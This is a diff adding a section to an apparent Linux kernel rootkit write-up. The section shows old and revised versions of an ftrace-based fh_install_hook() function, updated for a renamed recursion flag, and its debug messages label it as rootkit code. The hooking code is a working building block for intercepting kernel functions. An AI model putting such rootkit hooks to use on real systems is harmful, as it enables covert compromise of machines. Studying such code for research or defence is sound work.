@@ -42,6 +42,70 @@ static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, s
 }
 ```
 
+# Changes to fh_install_hook()
 
+ - This is the old snippet below of the function:
 
+```
+int fh_install_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = fh_resolve_hook_address(hook);
+    if(err)
+        return err;
+
+    hook->ops.func = fh_ftrace_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+            | FTRACE_OPS_FL_RECURSION_SAFE
+            | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
+        return err;
+    }
+
+    return 0;
+}
+```
+  - This is the revised snippet of code for the function below:
+
+```
+int fh_install_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = fh_resolve_hook_address(hook);
+    if(err)
+        return err;
+
+    hook->ops.func = fh_ftrace_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+            | FTRACE_OPS_FL_RECURSION
+            | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
+        return err;
+    }
+
+    return 0;
+}
+```
 
